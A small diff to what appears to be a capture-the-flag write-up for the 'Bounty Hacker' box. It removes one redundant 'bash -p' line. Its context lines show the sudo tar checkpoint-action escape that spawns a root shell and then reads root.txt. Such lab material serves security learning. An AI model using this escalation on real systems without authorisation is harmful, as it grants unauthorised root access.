@@ -163,7 +163,6 @@ I change /bin/sh to /bin/bash to get a good looking shell.
 lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
 [sudo] password for lin: 
 tar: Removing leading `/' from member names
-root@bountyhacker:~/Desktop# bash -p
 root@bountyhacker:~/Desktop# cd /root
 root@bountyhacker:/root# ls
 root.txt
